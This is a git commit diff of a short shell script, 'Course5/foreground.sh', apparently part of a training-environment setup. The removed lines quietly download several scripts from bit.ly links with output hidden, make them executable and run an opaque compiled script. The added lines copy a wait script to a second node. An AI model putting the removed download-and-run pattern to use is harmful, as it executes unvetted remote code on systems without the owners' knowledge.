db0bdd06854ba3459d279b1d0b2cc3d3b2b3925d
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 17:48:54 +0700

    Update foreground.sh

--- Course5/foreground.sh
+++ Course5/foreground.sh
@@ -1,20 +1,13 @@
 #!/bin/bash
-ssh node01
-wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
-clear
-wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
-clear
-wget -O winxpvm.sh https://bit.ly/3BNeNFj > /dev/null 2>&1
-clear
-wget -O check.sh.x https://bit.ly/3i8Tdn9 > /dev/null 2>&1
-clear
-wget -O region.sh https://bit.ly/3l6SmFa > /dev/null 2>&1
-clear
-wget -O spinner.sh https://bit.ly/3rSMCk1 > /dev/null 2>&1
-chmod +x winxpvm.sh
-chmod +x exit.sh
-chmod +x sleep.sh
-chmod +x region.sh
-chmod +x spinner.sh
-chmod +x check.sh.x
-./check.sh.x
+
+
+
+if [ "$HOSTNAME" = controlplane ]; then
+    while [ ! -f /usr/local/bin/wait.sh ]; do sleep 1; done; scp -r /usr/local/bin/wait.sh node01:/usr/local/bin/
+    ssh node01 
+
+else
+    sleep 999999
+fi
+  
+wait.sh
